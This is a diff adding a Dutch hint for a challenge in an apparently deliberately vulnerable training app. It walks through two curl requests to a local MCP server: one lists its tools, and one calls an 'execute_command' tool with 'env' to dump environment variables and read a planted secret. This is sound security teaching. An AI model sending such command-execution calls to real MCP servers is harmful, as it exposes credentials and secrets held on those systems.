@@ -1,0 +1,37 @@
+=== Hint voor uitdaging 60
+
+Deze uitdaging laat zien hoe een onveilige MCP-server (Model Context Protocol) secrets kan lekken die in omgevingsvariabelen zijn opgeslagen.
+
+**Waar je moet kijken:**
+
+1. **Er draait een aparte MCP-server op poort 8090** — anders dan de poort van de hoofdapplicatie (8080)
+2. **De MCP-server implementeert het JSON-RPC 2.0-protocol** zoals gedefinieerd in de MCP-specificatie
+3. **Begin met het opnoemen van de beschikbare tools** met de methode `tools/list`
+4. **Roep de `execute_command`-tool aan** — die geeft de omgevingsvariabelen van de server terug
+
+**Stap-voor-stap-aanpak:**
+
+Noem eerst de tools op die de MCP-server aanbiedt:
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
+----
+
+Roep daarna `execute_command` aan met een willekeurig shellcommando (zoals `env`):
+
+[source,bash]
+----
+curl -s -X POST http://localhost:8090/mcp \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
+----
+
+**Waar je op moet letten:**
+
+- Zoek de sleutel `WRONGSECRETS_MCP_SECRET` in de teruggegeven dump met omgevingsvariabelen
+- De waarde ernaast is het antwoord op deze uitdaging
+
+**Onthoud:** Het endpoint is ook toegankelijk op de hoofdpoort — probeer `/mcp` als poort 8090 niet bereikbaar is.
